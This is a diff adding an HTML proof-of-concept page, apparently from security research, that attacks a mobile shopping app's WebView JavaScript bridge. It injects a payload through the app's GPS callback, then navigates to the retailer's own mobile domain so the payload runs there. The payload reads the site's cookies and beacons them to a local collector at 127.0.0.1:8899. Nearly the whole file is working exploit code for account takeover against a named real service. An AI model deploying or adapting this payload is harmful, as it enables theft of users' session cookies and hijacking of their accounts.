@@ -1,0 +1,41 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>ATO-T</title></head>
+<body style="background:#111;color:#0f0;font-family:monospace;padding:16px;font-size:13px">
+<h3 style="color:#c9a96e">ATO Test v1 (GPS race)</h3>
+<div id="log"></div>
+<script>
+// 防御性定义: 注入前缀 sep._onSuccess(0) 不炸
+window.sep = {};
+sep._onSuccess = function(){};
+sep._onFailure = function(){};
+sep._onCancel  = function(){};
+
+function L(s){ document.getElementById('log').innerHTML += s + '<br>'; }
+function beacon(tag, extra){
+  new Image().src = 'http://127.0.0.1:8899/x?t=' + tag +
+    '&d=' + encodeURIComponent(extra || '').substring(0, 600);
+}
+
+beacon('page-load', location.href);
+L('page loaded: ' + location.href);
+
+if (typeof appHandler === 'undefined') {
+  L('NO bridge — not in app');
+  beacon('no-bridge', '');
+} else {
+  L('bridge OK, arming GPS callback...');
+  beacon('bridge-ok', navigator.userAgent.substring(0, 90));
+
+  // 阶段2载荷: 回调落在哪个页面, 就读那个页面的 origin + cookie 并 beacon 出来
+  var pay = "0);var c=document.cookie;new Image().src='http://127.0.0.1:8899/x?t=stage2&d='+encodeURIComponent(location.origin+' ||| '+c.substring(0,500));document.title='ATO:'+c.length;//";
+  appHandler.appMonitorScript('getGPS', pay, '{}');
+  L('GPS armed (t=0)');
+
+  // t=2s: 导航到丝芙兰自家域 (观察: 原地 or 新Activity — frida 会记录)
+  setTimeout(function() {
+    L('navigating to m.sephora.cn ...');
+    beacon('nav-start', '');
+    location.href = 'https://m.sephora.cn/beauty-community';
+  }, 2000);
+}
+</script></body></html>
